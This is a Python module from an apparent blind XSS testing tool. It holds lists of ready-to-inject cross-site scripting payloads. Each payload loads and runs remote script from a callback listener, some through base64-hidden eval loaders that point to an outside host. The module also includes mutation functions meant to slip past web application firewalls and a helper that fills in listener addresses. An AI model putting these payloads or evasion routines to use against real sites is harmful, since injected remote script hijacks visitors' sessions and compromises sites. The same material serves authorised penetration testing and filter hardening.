"""
Blind XSS Payload Templates

All payloads MUST contain {UUID} and {LISTENER} placeholders for correlation and callback.
Integrated from battle-tested payloads; context-aware for different injection points.
Callback format: {LISTENER}/c/{UUID}
"""
import random
import urllib.parse

# Script injection payloads (direct script tag loading, most reliable)
SCRIPT_PAYLOADS = [
    # Direct script tag with full URL
    '"><script src={LISTENER}/c/{UUID}></script>',
    'javascript:eval(\'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a)\')',
    '<svg onload="javascript:eval(\'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a)\')" />',
    '<iframe src="javascript:var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)"></iframe>',
    '<body onload="var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)">',
    
    # Protocol-relative loaders (jQuery, XHR, fetch)
    '<script>$.getScript("//{LISTENER_HOST}/c/{UUID}")</script>',
    '<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{LISTENER_HOST}/c/{UUID}");a.send();</script>',
    '<script>fetch("//{LISTENER_HOST}/c/{UUID}").then(r=>r.text()).then(t=>eval(t))</script>',
    
    # Inline script variable assignment
    'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a);',
]

# Event handler payloads (onerror, onfocus, onmouseover, onload)
EVENT_HANDLER_PAYLOADS = [
    # Image with base64 id attribute (eval(atob))
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsYW5icmFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>',
    
    # Input autofocus with base64 id
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsYW5icmFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus>',
    
    # Video source with onerror
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FsYW5icmFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==>',
    
    # Div with onmouseover
    '<div onmouseover="var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)">Hover me</div>',
    
    # Audio with onerror
    '<audio src="x" onerror="var a=document.createElement(\'script\');a.src=\'{LISTENER}/c/{UUID}\';document.body.appendChild(a)">',
]

# Filter bypass payloads (comment chains, import tricks, etc.)
BYPASS_PAYLOADS = [
    # JavaScript protocol with comment bypass chain
    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=(import(/https:\\{LISTENER_HOST}\\c\\{UUID}/.source))//>',
    
    # Simple bypass variants
    '"><svg onload=fetch("{LISTENER}/c/{UUID}") />',
    '"><iframe srcdoc="<script>fetch(\'{LISTENER}/c/{UUID}\')</script>" />',
]

# JSON context payloads (for API endpoint injection)
JSON_PAYLOADS = [
    '{{"key":"value","x":"<script src=\'{LISTENER}/c/{UUID}\'></script>"}}',
    '{{"key":"value","x":"</script><script src=\'{LISTENER}/c/{UUID}\'></script>"}}',
]

# Header injection payloads (Referer, X-Forwarded-For)
HEADER_PAYLOADS = [
    '</script><script src=\'{LISTENER}/c/{UUID}\'></script>',
    'javascript:eval(\'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a)\')',
]

# Cookie/localStorage exfiltration payloads (with data leakage)
EXFIL_PAYLOADS = [
    'var a=document.createElement("script");a.src="{LISTENER}/c/{UUID}";document.body.appendChild(a);',
]


def get_script_payloads():
    """Return script-based XSS payloads."""
    return SCRIPT_PAYLOADS


def get_event_handler_payloads():
    """Return event handler XSS payloads."""
    return EVENT_HANDLER_PAYLOADS


def get_bypass_payloads():
    """Return filter bypass XSS payloads."""
    return BYPASS_PAYLOADS


def get_json_payloads():
    """Return JSON context XSS payloads."""
    return JSON_PAYLOADS


def get_header_payloads():
    """Return HTTP header XSS payloads."""
    return HEADER_PAYLOADS


def get_exfil_payloads():
    """Return data exfiltration XSS payloads."""
    return EXFIL_PAYLOADS


def get_all_payloads():
    """Return all payload categories."""
    return {
        "script": SCRIPT_PAYLOADS,
        "event": EVENT_HANDLER_PAYLOADS,
        "bypass": BYPASS_PAYLOADS,
        "json": JSON_PAYLOADS,
        "header": HEADER_PAYLOADS,
        "exfil": EXFIL_PAYLOADS,
    }


# --- Mutation helpers (lightweight evasions) ---
def _mutate_case(payload: str) -> str:
    """Randomize casing of HTML/JS keywords to dodge naive filters."""
    return random.choice([payload.lower(), payload.upper(), payload.swapcase()])


def _insert_comment_gaps(payload: str) -> str:
    """Split risky tokens with harmless comment gaps (e.g., scr<!-- -->ipt)."""
    replacements = {
        "script": "scr<!-- -->ipt",
        "onerror": "on<!-- -->error",
        "onload": "on<!-- -->load",
        "javascript:": "java<!-- -->script:",
    }
    mutated = payload
    for needle, repl in replacements.items():
        mutated = mutated.replace(needle, repl).replace(needle.upper(), repl).replace(needle.capitalize(), repl)
    return mutated


def _pad_whitespace(payload: str) -> str:
    """Add benign whitespace to break strict regex rules."""
    return payload.replace("<", "< ").replace(">", " >")


def _html_entity_encode(payload: str) -> str:
    """Encode critical chars to bypass naive blockers (aggressive)."""
    return payload.replace("<", "&#60;").replace(">", "&#62;").replace("\"", "&#34;")


def _url_encode_fragments(payload: str) -> str:
    """URL-encode risky characters while keeping path separators (aggressive)."""
    return urllib.parse.quote(payload, safe="/:{}")


def apply_mutators(payload: str, aggressive: bool = False, max_mutations: int = 2) -> str:
    """Apply a small set of obfuscation steps to help bypass naive WAF filters."""
    base_mutators = [_mutate_case, _insert_comment_gaps, _pad_whitespace]
    extra_mutators = [_html_entity_encode, _url_encode_fragments] if aggressive else []
    mutators = base_mutators + extra_mutators
    try:
        choices = random.sample(mutators, k=min(max_mutations, len(mutators)))
        mutated = payload
        for fn in choices:
            mutated = fn(mutated)
        return mutated
    except Exception:
        return payload


def substitute_placeholders(payload: str, listener_url: str, uuid: str) -> str:
    """
    Replace {LISTENER}, {LISTENER_HOST}, and {UUID} in payload template.
    
    Args:
        payload: Payload template string with placeholders
        listener_url: Full listener URL (e.g., http://192.168.1.10:5000)
        uuid: Unique identifier for this injection
    
    Returns:
        Substituted payload string ready for injection
    """
    listener_url = listener_url.rstrip('/')
    # Extract host from URL for protocol-relative payloads
    listener_host = listener_url.split('://')[-1] if '://' in listener_url else listener_url
    
    return payload.replace('{LISTENER}', listener_url).replace('{LISTENER_HOST}', listener_host).replace('{UUID}', uuid)


def get_payloads_for_context(context: str, listener_url: str, uuid: str) -> list:
    """
    Get context-specific payloads with placeholders substituted.
    
    Args:
        context: Injection context ('query', 'body', 'header', 'json')
        listener_url: Full listener callback URL
        uuid: Unique identifier for this injection
    
    Returns:
        List of ready-to-inject payload strings
    """
    all_payloads = get_all_payloads()
    
    if context == 'query' or context == 'body':
        # Use script + event + bypass for standard form/query injection
        payloads = all_payloads['script'] + all_payloads['event'] + all_payloads['bypass']
    elif context == 'json':
        # Use JSON-safe payloads for JSON parameters
        payloads = all_payloads['json']
    elif context == 'header':
        # Use header-safe payloads for HTTP headers
        payloads = all_payloads['header']
    else:
        # Fallback: all payloads
        payloads = all_payloads['script']
    
    return [substitute_placeholders(p, listener_url, uuid) for p in payloads]

